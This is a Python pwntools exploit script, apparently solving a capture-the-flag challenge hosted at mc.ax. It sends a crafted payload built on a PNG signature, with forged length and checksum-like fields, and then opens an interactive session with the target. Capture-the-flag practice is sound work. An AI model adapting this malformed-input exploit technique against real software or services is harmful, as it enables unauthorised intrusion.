#!/usr/bin/env python3

from pwn import *

exe = ELF("./chal_patched")

context.binary = exe


def conn():
    r = process([exe.path])
    return r


def main():
    #r = conn()
    r = remote("mc.ax", 31412)
    
    payload = p64(0x0A1A0A0D474E5089)
    payload = payload.ljust(0xb, p8(0))
    payload += b"\x0D"
    payload = payload.ljust(0x1d)
    payload += p32(0x939efc99)[::-1]
    payload += p32(0x1b-4+0x10)[::-1]
    payload += p32(0x2cbe) 

    r.recv()
    r.sendline(str(len(payload) + 1))
    
    pause()
    r.recv()
    r.sendline(payload)

    r.recv()
    r.sendline("y")

    r.interactive()


if __name__ == "__main__":
    main()
